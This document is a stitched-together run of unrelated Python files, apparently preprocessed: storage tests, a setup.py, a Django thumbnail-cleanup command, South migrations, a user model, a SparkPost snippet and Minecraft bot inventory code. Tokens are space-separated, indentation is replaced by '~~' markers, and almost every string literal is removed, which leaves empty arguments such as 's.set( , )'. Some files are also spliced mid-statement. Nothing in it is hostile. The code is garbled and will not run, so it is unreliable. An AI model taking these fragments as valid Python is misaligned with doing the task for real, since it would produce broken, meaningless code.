kwargs [ ] = [ fields . Field ( subfieldname , \n 
conv = char , \n 
label = label , \n 
widget = widgets . PasswordInput ) \n 
for subfieldname , label in items ] \n 
kwargs . setdefault ( , PasswordConv ( required = required ) ) \n 
kwargs . setdefault ( , widgets . FieldSetWidget ( \n 
template = ) ) \n 
return fields . FieldSet ( name , get_initial = lambda : , ** kwargs ) \n 
\n 
# -*- coding: utf-8 -*- \n 
\n 
~~ __all__ = [ , ] \n 
\n 
import unittest \n 
from iktomi . storage import LocalMemStorage , MemcachedStorage \n 
\n 
\n 
class LocalMemStorageTest ( unittest . TestCase ) : \n 
~~~ def test_set ( self ) : \n 
~~~ \n 
s = LocalMemStorage ( ) \n 
s . set ( , ) \n 
self . assertEqual ( s . storage [ ] , ) \n 
\n 
~~ def test_set_rewrite ( self ) : \n 
~~~ \n 
s = LocalMemStorage ( ) \n 
s . set ( , ) \n 
s . set ( , ) \n 
self . assertEqual ( s . storage [ ] , ) \n 
\n 
~~ def test_get ( self ) : \n 
~~~ \n 
s = LocalMemStorage ( ) \n 
self . assertEqual ( s . get ( ) , None ) \n 
self . assertEqual ( s . get ( , ) , ) \n 
s . set ( , ) \n 
self . assertEqual ( s . get ( ) , ) \n 
\n 
~~ def test_delete ( self ) : \n 
~~~ \n 
s = LocalMemStorage ( ) \n 
self . assertEqual ( s . delete ( ) , True ) \n 
s . set ( , ) \n 
self . assertEqual ( s . delete ( ) , True ) \n 
self . assertEqual ( s . get ( ) , None ) \n 
\n 
\n 
~~ ~~ class MemcachedStorageTest ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . storage = MemcachedStorage ( ) \n 
if not self . storage . storage . set ( , ) : \n 
~~~ raise Exception ( ) \n 
\n 
~~ ~~ def tearDown ( self ) : \n 
~~~ memcached = self . storage . storage \n 
memcached . delete ( ) \n 
memcached . delete ( ) \n 
memcached . disconnect_all ( ) \n 
\n 
~~ def test_set ( self ) : \n 
~~~ \n 
self . assertEqual ( self . storage . set ( , ) , True ) \n 
self . assertEqual ( self . storage . set ( , ) , True ) \n 
\n 
~~ def test_get ( self ) : \n 
~~~ \n 
self . assertEqual ( self . storage . get ( ) , None ) \n 
self . assertEqual ( self . storage . get ( , ) , ) \n 
self . storage . set ( , ) \n 
self . assertEqual ( self . storage . get ( ) , ) \n 
\n 
~~ def test_delete ( self ) : \n 
~~~ \n 
self . assertEqual ( self . storage . delete ( ) , True ) \n 
self . storage . set ( , ) \n 
self . assertEqual ( self . storage . delete ( ) , True ) \n 
self . assertEqual ( self . storage . get ( ) , None ) \n 
#!/usr/bin/python \n 
# -*- coding: utf-8 -*- \n 
\n 
\n 
~~ ~~ \'\'\' Copyright 2012 Smartling, Inc.\n *\n * Licensed under the Apache License, Version 2.0 (the "License");\n * you may not use this work except in compliance with the License.\n * You may obtain a copy of the License in the LICENSE file, or at:\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an "AS IS" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n\'\'\' \n 
\n 
from setuptools import setup \n 
\n 
setup ( \n 
name = "SmartlingApiSdk" , \n 
version = "1.2.5" , \n 
author = "Smartling, Inc." , \n 
author_email = "aartamonov@smartling.com" , \n 
description = "Smartling python library for file translations" , \n 
license = , \n 
keywords = , \n 
url = "https://docs.smartling.com/display/docs/Files+API" , \n 
long_description = "python SDK to work with Smartling API for file translation" , \n 
packages = [ , "simplejson24" , "example" , "test" ] , \n 
include_package_data = True , \n 
package_data = { \n 
: [ , ] , \n 
} , \n 
\n 
) \n 
import gc \n 
import os \n 
import time \n 
from datetime import datetime , date , timedelta \n 
from optparse import make_option \n 
\n 
from django . core . files . storage import get_storage_class \n 
from django . core . management . base import BaseCommand \n 
from easy_thumbnails . conf import settings \n 
from easy_thumbnails . models import Source \n 
\n 
\n 
class ThumbnailCollectionCleaner ( object ) : \n 
~~~ """\n    Remove thumbnails and DB references to non-existing source images.\n    """ \n 
sources = 0 \n 
thumbnails = 0 \n 
thumbnails_deleted = 0 \n 
source_refs_deleted = 0 \n 
execution_time = 0 \n 
\n 
def _get_absolute_path ( self , path ) : \n 
~~~ return os . path . join ( settings . MEDIA_ROOT , path ) \n 
\n 
~~ def _get_relative_path ( self , path ) : \n 
~~~ return os . path . relpath ( path , settings . MEDIA_ROOT ) \n 
\n 
~~ def _check_if_exists ( self , storage , path ) : \n 
~~~ try : \n 
~~~ return storage . exists ( path ) \n 
~~ except Exception as e : \n 
~~~ print ( "Something went wrong when checking existance of %s:" % path ) \n 
print ( str ( e ) ) \n 
\n 
~~ ~~ def _delete_sources_by_id ( self , ids ) : \n 
~~~ Source . objects . all ( ) . filter ( id__in = ids ) . delete ( ) \n 
\n 
~~ def clean_up ( self , dry_run = False , verbosity = 1 , last_n_days = 0 , \n 
cleanup_path = None , storage = None ) : \n 
~~~ """\n        Iterate through sources. Delete database references to sources\n        not existing, including its corresponding thumbnails (files and\n        database references).\n        """ \n 
if dry_run : \n 
~~~ print ( "Dry run..." ) \n 
\n 
~~ if not storage : \n 
~~~ storage = get_storage_class ( settings . THUMBNAIL_DEFAULT_STORAGE ) ( ) \n 
\n 
~~ sources_to_delete = [ ] \n 
time_start = time . time ( ) \n 
\n 
query = Source . objects . all ( ) \n 
if last_n_days > 0 : \n 
~~~ today = date . today ( ) \n 
query = query . filter ( \n 
modified__range = ( today - timedelta ( days = last_n_days ) , today ) ) \n 
~~ if cleanup_path : \n 
~~~ query = query . filter ( name__startswith = cleanup_path ) \n 
\n 
~~ for source in queryset_iterator ( query ) : \n 
~~~ self . sources += 1 \n 
abs_source_path = self . _get_absolute_path ( source . name ) \n 
\n 
if not self . _check_if_exists ( storage , abs_source_path ) : \n 
~~~ if verbosity > 0 : \n 
~~~ print ( "Source not present:" , abs_source_path ) \n 
~~ self . source_refs_deleted += 1 \n 
sources_to_delete . append ( source . id ) \n 
\n 
for thumb in source . thumbnails . all ( ) : \n 
~~~ self . thumbnails_deleted += 1 \n 
abs_thumbnail_path = self . _get_absolute_path ( thumb . name ) \n 
\n 
if self . _check_if_exists ( storage , abs_thumbnail_path ) : \n 
~~~ if not dry_run : \n 
~~~ storage . delete ( abs_thumbnail_path ) \n 
~~ if verbosity > 0 : \n 
~~~ print ( "Deleting thumbnail:" , abs_thumbnail_path ) \n 
\n 
~~ ~~ ~~ ~~ if len ( sources_to_delete ) >= 1000 and not dry_run : \n 
~~~ self . _delete_sources_by_id ( sources_to_delete ) \n 
sources_to_delete = [ ] \n 
\n 
~~ ~~ if not dry_run : \n 
~~~ self . _delete_sources_by_id ( sources_to_delete ) \n 
~~ self . execution_time = round ( time . time ( ) - time_start ) \n 
\n 
~~ def print_stats ( self ) : \n 
~~~ """\n        Print statistics about the cleanup performed.\n        """ \n 
print ( \n 
"{0:-<48}" . format ( str ( datetime . now ( ) . strftime ( ) ) ) ) \n 
print ( "{0:<40} {1:>7}" . format ( "Sources checked:" , self . sources ) ) \n 
print ( "{0:<40} {1:>7}" . format ( \n 
"Source references deleted from DB:" , self . source_refs_deleted ) ) \n 
print ( "{0:<40} {1:>7}" . format ( "Thumbnails deleted from disk:" , \n 
self . thumbnails_deleted ) ) \n 
print ( "(Completed in %s seconds)\\n" % self . execution_time ) \n 
\n 
\n 
~~ ~~ def queryset_iterator ( queryset , chunksize = 1000 ) : \n 
~~~ """\n    The queryset iterator helps to keep the memory consumption down.\n    And also making it easier to process for weaker computers.\n    """ \n 
\n 
primary_key = 0 \n 
last_pk = queryset . order_by ( ) [ 0 ] . pk \n 
queryset = queryset . order_by ( ) \n 
while primary_key < last_pk : \n 
~~~ for row in queryset . filter ( pk__gt = primary_key ) [ : chunksize ] : \n 
~~~ primary_key = row . pk \n 
yield row \n 
~~ gc . collect ( ) \n 
\n 
\n 
~~ ~~ class Command ( BaseCommand ) : \n 
~~~ help = """ Deletes thumbnails that no longer have an original file. """ \n 
\n 
option_list = BaseCommand . option_list + ( \n 
make_option ( \n 
, \n 
action = , \n 
dest = , \n 
default = False , \n 
help = ) , \n 
make_option ( \n 
, \n 
action = , \n 
dest = , \n 
default = 0 , \n 
type = , \n 
help = ) , \n 
make_option ( \n 
, \n 
action = , \n 
dest = , \n 
type = , \n 
help = ) , \n 
) \n 
\n 
def handle ( self , * args , ** options ) : \n 
~~~ tcc = ThumbnailCollectionCleaner ( ) \n 
tcc . clean_up ( \n 
dry_run = options . get ( , False ) , \n 
verbosity = int ( options . get ( , 1 ) ) , \n 
last_n_days = int ( options . get ( , 0 ) ) , \n 
cleanup_path = options . get ( ) ) \n 
tcc . print_stats ( ) \n 
# encoding: utf-8 \n 
~~ ~~ import datetime \n 
from south . db import db \n 
from south . v2 import SchemaMigration \n 
from django . db import models \n 
\n 
class Migration ( SchemaMigration ) : \n 
\n 
~~~ def forwards ( self , orm ) : \n 
\n 
\n 
~~~ db . delete_unique ( , [ , ] ) \n 
\n 
\n 
db . create_unique ( , [ , , ] ) \n 
\n 
\n 
~~ def backwards ( self , orm ) : \n 
\n 
\n 
~~~ db . delete_unique ( , [ , , ] ) \n 
\n 
\n 
db . create_unique ( , [ , ] ) \n 
\n 
\n 
~~ models = { \n 
: { \n 
: { : "((\'storage_hash\', \'name\'),)" , : } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : : ( , [ ] , { : , : : ( , [ ] , { : , } , \n 
: { \n 
: { : "((\'storage_hash\', \'name\', \'source\'),)" , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : : ( , [ ] , { : , : : ( , [ ] , { : "\'thumbnails\'" : ( , [ ] , { : , } \n 
} \n 
\n 
complete_apps = [ ] \n 
#!/usr/bin/env python \n 
\n 
~~ __author__ = \n 
__copyright__ = \n 
__credits__ = [ ] \n 
\n 
__license__ = \n 
__version__ = \n 
__maintainer__ = \n 
__email__ = \n 
__status__ = \n 
\n 
__all__ = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] from django . contrib . auth . models import AbstractBaseUser , PermissionsMixin \n 
from django . contrib . auth . models import UserManager \n 
from django . contrib . flatpages . models import FlatPage \n 
from django . core . urlresolvers import reverse \n 
from django . db . models import signals \n 
from django . templatetags . static import static \n 
from django . utils import timezone \n 
\n 
from django . db import models \n 
from allauth . account . models import EmailAddress \n 
from django_countries . fields import CountryField \n 
\n 
from skills . models import Skill , TrainingBit \n 
\n 
# USERTYPES = ( \n 
\n 
\n 
\n 
# ) \n 
\n 
class CustomUserManager ( UserManager ) : \n 
\n 
~~~ def create_superuser ( self , username , password , ** kwargs ) : \n 
~~~ user = self . model ( username = username , is_staff = True , is_superuser = True , ** kwargs ) \n 
user . set_password ( password ) \n 
user . save ( ) \n 
return user \n 
\n 
~~ ~~ class User ( AbstractBaseUser , PermissionsMixin ) : \n 
\n 
~~~ USERNAME_FIELD = \n 
\n 
# Metadata \n 
datetime_joined = models . DateTimeField ( default = timezone . now ) \n 
\n 
# Content \n 
username = models . CharField ( max_length = 40 , unique = True , error_messages = { \n 
: \n 
} ) \n 
# The error message on duplicate unique values cannot be set in forms \n 
# https://code.djangoproject.com/ticket/8913 \n 
email = models . CharField ( max_length = 100 , blank = True ) \n 
image = models . ImageField ( upload_to = , null = True , blank = True ) \n 
description = models . TextField ( blank = True ) \n 
\n 
# Relations \n 
skills_in_progress = models . ManyToManyField ( Skill , blank = True , related_name = ) skills_completed = models . ManyToManyField ( Skill , blank = True , related_name = ) \n 
#   maybe another name for skills_completed?: skills_taken, skills_done \n 
\n 
#   Keep these names consistent with the ones above: \n 
#     skills_completed <-> trainingbits_completed \n 
trainingbits_in_progress = models . ManyToManyField ( TrainingBit , blank = True , related_name = trainingbits_completed = models . ManyToManyField ( TrainingBit , blank = True , related_name = \n 
# Flags \n 
is_active = models . BooleanField ( default = True ) \n 
has_been_welcomed = models . BooleanField ( default = False ) \n 
\n 
def is_taking_skill ( self , skill ) : \n 
~~~ return skill in self . skills_in_progress . all ( ) \n 
\n 
~~ def complete_skill ( self , completed_skill ) : \n 
~~~ skills = self . complete_skills ( [ complete_skill ] ) \n 
return skills [ 0 ] \n 
\n 
~~ def complete_skills ( self , completed_skills ) : \n 
~~~ self . skills_in_progress . remove ( * completed_skills ) \n 
self . skills_completed . add ( * completed_skills ) \n 
return completed_skills \n 
\n 
~~ def has_completed_skill ( self , skill ) : \n 
~~~ return skill in self . skills_completed . all ( ) \n 
\n 
~~ def is_taking_trainingbit ( self , trainingbit ) : \n 
~~~ return trainingbit in self . trainingbits_in_progress . all ( ) \n 
\n 
~~ def complete_trainingbit ( self , completed_trainingbit ) : \n 
~~~ tbs = self . complete_trainingbits ( [ completed_trainingbit ] ) \n 
return tbs [ 0 ] \n 
\n 
~~ def complete_trainingbits ( self , completed_trainingbits ) : \n 
~~~ self . trainingbits_in_progress . remove ( * completed_trainingbits ) \n 
self . trainingbits_completed . add ( * completed_trainingbits ) \n 
return completed_trainingbits \n 
\n 
~~ def has_completed_trainingbit ( self , trainingbit ) : \n 
~~~ return trainingbit in self . trainingbits_completed . all ( ) \n 
\n 
# See: http://stackoverflow.com/questions/2771676/django-default-datetime-now-problem \n 
# this: \n 
#   from datetime import datetime \n 
#   date_joined = models.DateField(default=datetime.now) \n 
# or this: \n 
\n 
~~ def get_full_name ( self ) : \n 
# The user is identified by their email address \n 
~~~ return self . email \n 
\n 
~~ def get_short_name ( self ) : \n 
# The user is identified by their email address \n 
~~~ return self . email \n 
\n 
\n 
~~ objects = CustomUserManager ( ) \n 
\n 
def account_verified ( self ) : \n 
~~~ if self . user . is_authenticated : \n 
~~~ result = EmailAddress . objects . get_primary ( self . user ) \n 
#result = EmailAddress.objects.filter(email=self.user.email) \n 
if len ( result ) : \n 
~~~ return result [ 0 ] . verified \n 
~~ ~~ return False \n 
\n 
~~ @ property \n 
def is_trainer ( self ) : \n 
~~~ if self . is_admin : \n 
~~~ return True \n 
~~ return self . groups . filter ( name = ) \n 
\n 
~~ @ property \n 
def is_admin ( self ) : \n 
~~~ return self . groups . filter ( name = ) or self . is_superuser \n 
\n 
# is_staff = models.BooleanField() \n 
~~ @ property \n 
def is_staff ( self ) : \n 
~~~ "Is the user a member of staff?" \n 
# Simplest possible answer: All admins are staff \n 
return self . is_admin or self . is_trainer \n 
\n 
~~ def get_absolute_url ( self ) : \n 
~~~ return reverse ( , args = [ self . id ] ) \n 
\n 
~~ def getImage ( self ) : \n 
~~~ if self . image : \n 
~~~ return self . image . url \n 
~~ else : \n 
~~~ return static ( ) \n 
\n 
#signals.post_save.connect(update_allauth_primary_email, sender=User) \n 
\n 
\n 
~~ ~~ ~~ class UserInfo ( models . Model ) : \n 
\n 
~~~ SEXES = [ \n 
# (data representation, textual/user representation) \n 
( , ) , \n 
( , ) , \n 
] \n 
ORGANISATION_TYPES = [ \n 
( , ) , \n 
( , ) , \n 
( , ) , \n 
( , ) , \n 
] \n 
\n 
# Content \n 
sex = models . CharField ( max_length = 20 , choices = SEXES , blank = False ) \n 
country = CountryField ( null = True ) \n 
birthdate = models . DateField ( null = True ) \n 
organization = models . CharField ( max_length = 15 , choices = ORGANISATION_TYPES , blank = False ) \n 
# Relations \n 
user = models . OneToOneField ( User , null = True , blank = True ) \n 
\n 
\n 
# http://stackoverflow.com/a/10408140/118608 \n 
~~ def get_or_create_userinfo ( user ) : \n 
~~~ """\n    Return the UserInfo for the given user, creating one if it does not exist.\n\n    This will also set user.userinfo to cache the result.\n    """ \n 
userinfo , c = UserInfo . objects . get_or_create ( user = user ) \n 
\n 
return userinfo \n 
\n 
~~ User . userinfo = property ( get_or_create_userinfo ) \n 
\n 
class GCLFlatPage ( FlatPage ) : \n 
~~~ show_in_footer = models . BooleanField ( default = False ) \n 
class Meta : \n 
~~~ verbose_name = "flat page" \n 
verbose_name_plural = "flat pages" \n 
~~ def get_absolute_url ( self ) : \n 
~~~ return reverse ( , args = [ self . url ] ) \n 
\n 
~~ ~~ from solo . models import SingletonModel \n 
\n 
class SiteConfiguration ( SingletonModel ) : \n 
\n 
# maintenance_mode = models.BooleanField(default=False) \n 
~~~ analytics_code = models . TextField ( help_text = \n 
def __unicode__ ( self ) : \n 
~~~ return "Site Configuration (Google Analytics)" \n 
\n 
~~ class Meta : \n 
~~~ verbose_name = "Site Configuration" \n 
verbose_name_plural = "Site Configuration" \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ from south . utils import datetime_utils as datetime \n 
from south . db import db \n 
from south . v2 import SchemaMigration \n 
from django . db import models \n 
import re \n 
from django . utils . text import slugify \n 
\n 
\n 
class Migration ( SchemaMigration ) : \n 
\n 
~~~ def forwards ( self , orm ) : \n 
~~~ if not db . dry_run : \n 
# Ensure that existing slugs are unique \n 
~~~ for _class in [ orm . Skill , orm . Project , orm . TrainingBit ] : \n 
~~~ for obj in _class . objects . all ( ) : \n 
~~~ objs_with_slug = _class . objects . filter ( slug__exact = obj . slug ) \n 
\n 
# Empty slug encountered \n 
if obj . slug == : \n 
~~~ obj . slug = slugify ( obj . name ) \n 
# raise Exception(\'Empty slug for object: %s, new slug "%s"\' % (obj.name, obj.slug)) if obj . slug == : \n 
~~~ obj . slug = \n 
\n 
~~ ~~ if objs_with_slug . count ( ) > 1 : \n 
# The slug of this object is not unique! \n 
~~~ existing_slugs = _class . objects . filter ( slug__regex = + obj . slug + ) . values_list ( , flat = True ) \n 
if len ( existing_slugs ) > 0 : \n 
# Grab number from highest existing slug \n 
~~~ last_existing_slug = sorted ( existing_slugs ) [ - 1 ] \n 
m = re . match ( , last_existing_slug ) \n 
id_counter = int ( m . group ( 1 ) ) + 1 \n 
~~ else : \n 
~~~ id_counter = 1 \n 
\n 
# Generate new unique slug \n 
~~ obj . slug = % ( obj . slug , id_counter ) \n 
\n 
# Save \n 
~~ obj . save ( ) \n 
\n 
\n 
~~ ~~ ~~ db . create_unique ( , [ ] ) \n 
\n 
\n 
db . create_unique ( , [ ] ) \n 
\n 
\n 
db . create_unique ( , [ ] ) \n 
\n 
\n 
~~ def backwards ( self , orm ) : \n 
\n 
~~~ db . delete_unique ( , [ ] ) \n 
\n 
\n 
db . delete_unique ( , [ ] ) \n 
\n 
\n 
db . delete_unique ( , [ ] ) \n 
\n 
\n 
~~ models = { \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } : ( , [ ] , { : , } , \n 
: { \n 
: { : , : "(\'content_type__app_label\', \'content_type__model\', \'codename\')" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'contenttypes.ContentType\']" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: { : "\'django_content_type\'" , : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : : ( , [ ] , { : : ( , [ ] , { : ( , [ ] , { : ( , [ ] , { : : ( , [ ] , { : , : } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : "orm[\'global_change_lab.User\']" : ( , [ ] , { : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : "orm[\'skills.Comment\']" : ( , [ ] , { : "orm[\'skills.Project\']" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { } ) \n 
} , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : "orm[\'global_change_lab.User\']" : ( , [ ] , { : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : ( , [ ] , { } ) \n 
} , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : "orm[\'global_change_lab.User\']" : ( , [ ] , { : "orm[\'contenttypes.ContentType\']" : ( , [ ] , { : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { } ) , \n 
: ( , [ ] , { } ) \n 
} , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : "orm[\'global_change_lab.User\']" : ( , [ ] , { } ) , \n 
: ( , [ ] , { : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } : ( , [ ] , { : "orm[\'skills.TrainingBit\']" : ( , [ ] , { } ) , \n 
: ( , [ ] , { : , : , } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : "orm[\'global_change_lab.User\']" : ( , [ ] , { : : ( , [ ] , { } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } : ( , [ ] , { : , : ( , [ ] , { } ) \n 
} , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : "orm[\'global_change_lab.User\']" : ( , [ ] , { : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : , : ( , [ ] , { : , : : ( , [ ] , { : : ( , [ ] , { } ) \n 
} , \n 
: { \n 
: { : , : "[\'-created_at\']" } , \n 
: ( , [ ] , { : "orm[\'global_change_lab.User\']" : ( , [ ] , { : : ( , [ ] , { } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : \'\\\'{"learn":[],"act":[],"share":[]}\\\'\' : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } : ( , [ ] , { } ) \n 
} \n 
} \n 
\n 
complete_apps = [ ] \n 
~~ from sparkpost import SparkPost \n 
\n 
sp = SparkPost ( ) \n 
result = sp . suppression_list . update ( { \n 
: , \n 
: False , \n 
: True , \n 
: \n 
} ) \n 
print ( result ) \n 
from . utils import wrap_future \n 
from . . transmissions import Transmissions as SyncTransmissions \n 
\n 
\n 
class Transmissions ( SyncTransmissions ) : \n 
~~~ def get ( self , transmission_id ) : \n 
~~~ results = self . _fetch_get ( transmission_id ) \n 
return wrap_future ( results , lambda f : f [ "transmission" ] ) \n 
~~ ~~ import sys \n 
import types \n 
\n 
from minecraft_data . v1_8 import windows as windows_by_id \n 
from minecraft_data . v1_8 import windows_list \n 
\n 
from spockbot . mcdata import constants , get_item_or_block \n 
from spockbot . mcdata . blocks import Block \n 
from spockbot . mcdata . items import Item \n 
from spockbot . mcdata . utils import camel_case , snake_case \n 
\n 
\n 
def make_slot_check ( wanted ) : \n 
~~~ """\n    Creates and returns a function that takes a slot\n    and checks if it matches the wanted item.\n\n    Args:\n        wanted: function(Slot) or Slot or itemID or (itemID, metadata)\n    """ \n 
if isinstance ( wanted , types . FunctionType ) : \n 
~~~ return wanted # just forward the slot check function \n 
\n 
~~ if isinstance ( wanted , int ) : \n 
~~~ item , meta = wanted , None \n 
~~ elif isinstance ( wanted , Slot ) : \n 
~~~ item , meta = wanted . item_id , wanted . damage # TODO compare NBT \n 
~~ elif isinstance ( wanted , ( Item , Block ) ) : \n 
~~~ item , meta = wanted . id , wanted . metadata \n 
~~ elif isinstance ( wanted , str ) : \n 
~~~ item_or_block = get_item_or_block ( wanted , init = True ) \n 
item , meta = item_or_block . id , item_or_block . metadata \n 
~~ else : # wanted is (id, meta) \n 
~~~ try : \n 
~~~ item , meta = wanted \n 
~~ except TypeError : \n 
~~~ raise ValueError ( % wanted ) \n 
\n 
~~ ~~ return lambda slot : item == slot . item_id and meta in ( None , slot . damage ) \n 
\n 
\n 
~~ class Slot ( object ) : \n 
~~~ def __init__ ( self , window , slot_nr , id = constants . INV_ITEMID_EMPTY , \n 
damage = 0 , amount = 0 , enchants = None ) : \n 
~~~ self . window = window \n 
self . slot_nr = slot_nr \n 
self . item_id = id \n 
self . damage = damage \n 
self . amount = amount \n 
self . nbt = enchants \n 
self . item = get_item_or_block ( self . item_id , self . damage ) or Item ( ) \n 
\n 
~~ def move_to_window ( self , window , slot_nr ) : \n 
~~~ self . window , self . slot_nr = window , slot_nr \n 
\n 
~~ @ property \n 
def is_empty ( self ) : \n 
# could also check self.item_id == constants.INV_ITEMID_EMPTY \n 
~~~ return self . amount <= 0 \n 
\n 
~~ def matches ( self , other ) : \n 
~~~ return make_slot_check ( other ) ( self ) \n 
\n 
~~ def stacks_with ( self , other ) : \n 
~~~ if self . item_id != other . item_id : \n 
~~~ return False \n 
~~ if self . damage != other . damage : \n 
~~~ return False \n 
\n 
#                           % (self, other)) \n 
# if self.nbt != other.nbt: return False \n 
# TODO implement stacking correctly (NBT data comparison) \n 
~~ return self . item . stack_size != 1 \n 
\n 
~~ def get_dict ( self ) : \n 
~~~ """ Formats the slot for network packing. """ \n 
data = { : self . item_id } \n 
if self . item_id != constants . INV_ITEMID_EMPTY : \n 
~~~ data [ ] = self . damage \n 
data [ ] = self . amount \n 
if self . nbt is not None : \n 
~~~ data [ ] = self . nbt \n 
~~ ~~ return data \n 
\n 
~~ def copy ( self ) : \n 
~~~ return Slot ( self . window , self . slot_nr , self . item_id , \n 
self . damage , self . amount , self . nbt ) \n 
\n 
~~ def __bool__ ( self ) : \n 
~~~ return not self . is_empty \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ if self . is_empty : \n 
~~~ s = \n 
~~ else : \n 
~~~ item = self . item \n 
s = % ( self . amount , item . stack_size , str ( item ) ) \n 
\n 
~~ if self . slot_nr != - 1 : \n 
~~~ s += % self . slot_nr \n 
~~ if self . window : \n 
~~~ s += % self . window \n 
~~ return % s \n 
\n 
\n 
~~ ~~ class SlotCursor ( Slot ) : \n 
~~~ def __init__ ( self , id = constants . INV_ITEMID_EMPTY , damage = 0 , amount = 0 , \n 
enchants = None ) : \n 
~~~ class CursorWindow ( object ) : # TODO is there a cleaner way to do this? \n 
~~~ window_id = constants . INV_WINID_CURSOR \n 
\n 
def __repr__ ( self ) : \n 
~~~ return \n 
\n 
~~ ~~ super ( SlotCursor , self ) . __init__ ( \n 
CursorWindow ( ) , constants . INV_SLOT_NR_CURSOR , \n 
id , damage , amount , enchants ) \n 
\n 
\n 
~~ ~~ class BaseClick ( object ) : \n 
~~~ def get_packet ( self , inv_plugin ) : \n 
~~~ """\n        Called by send_click() to prepare the sent packet.\n        Abstract method.\n\n        Args:\n            inv_plugin (InventoryPlugin): inventory plugin instance\n        """ \n 
raise NotImplementedError ( ) \n 
\n 
~~ def apply ( self , inv_plugin ) : \n 
~~~ """\n        Called by on_success().\n        Abstract method.\n\n        Args:\n            inv_plugin (InventoryPlugin): inventory plugin instance\n        """ \n 
raise NotImplementedError ( ) \n 
\n 
~~ def on_success ( self , inv_plugin , emit_set_slot ) : \n 
~~~ """\n        Called when the click was successful\n        and should be applied to the inventory.\n\n        Args:\n            inv_plugin (InventoryPlugin): inventory plugin instance\n            emit_set_slot (func): function to signal a slot change,\n                should be InventoryPlugin().emit_set_slot\n        """ \n 
self . dirty = set ( ) \n 
self . apply ( inv_plugin ) \n 
for changed_slot in self . dirty : \n 
~~~ emit_set_slot ( changed_slot ) \n 
\n 
# helper methods, used by children \n 
# all argument instances are modified in-place \n 
\n 
~~ ~~ def copy_slot_type ( self , slot_from , slot_to ) : \n 
~~~ slot_to . item_id , slot_to . damage = slot_from . item_id , slot_from . damage \n 
slot_to . nbt = slot_from . nbt \n 
self . mark_dirty ( slot_to ) \n 
\n 
~~ def swap_slots ( self , slot_a , slot_b ) : \n 
~~~ slot_a . item_id , slot_b . item_id = slot_b . item_id , slot_a . item_id \n 
slot_a . damage , slot_b . damage = slot_b . damage , slot_a . damage \n 
slot_a . amount , slot_b . amount = slot_b . amount , slot_a . amount \n 
slot_a . nbt , slot_b . nbt = slot_b . nbt , slot_a . nbt \n 
self . mark_dirty ( slot_a ) \n 
self . mark_dirty ( slot_b ) \n 
\n 
~~ def transfer ( self , from_slot , to_slot , max_amount ) : \n 
~~~ transfer_amount = min ( max_amount , from_slot . amount , \n 
to_slot . item . stack_size - to_slot . amount ) \n 
if transfer_amount <= 0 : \n 
~~~ return \n 
~~ self . copy_slot_type ( from_slot , to_slot ) \n 
to_slot . amount += transfer_amount \n 
from_slot . amount -= transfer_amount \n 
self . cleanup_if_empty ( from_slot ) \n 
\n 
~~ def cleanup_if_empty ( self , slot ) : \n 
~~~ if slot . is_empty : \n 
~~~ empty_slot_at_same_position = Slot ( slot . window , slot . slot_nr ) \n 
self . copy_slot_type ( empty_slot_at_same_position , slot ) \n 
~~ self . mark_dirty ( slot ) \n 
\n 
~~ def mark_dirty ( self , slot ) : \n 
~~~ self . dirty . add ( slot ) \n 
\n 
\n 
~~ ~~ class SingleClick ( BaseClick ) : \n 
~~~ def __init__ ( self , slot , button = constants . INV_BUTTON_LEFT ) : \n 
~~~ self . slot = slot \n 
self . button = button \n 
if button not in ( constants . INV_BUTTON_LEFT , \n 
constants . INV_BUTTON_RIGHT ) : \n 
~~~ raise NotImplementedError ( \n 
% button ) \n 
\n 
~~ ~~ def get_packet ( self , inv_plugin ) : \n 
~~~ slot_nr = self . slot . slot_nr \n 
if self . slot == inv_plugin . cursor_slot : \n 
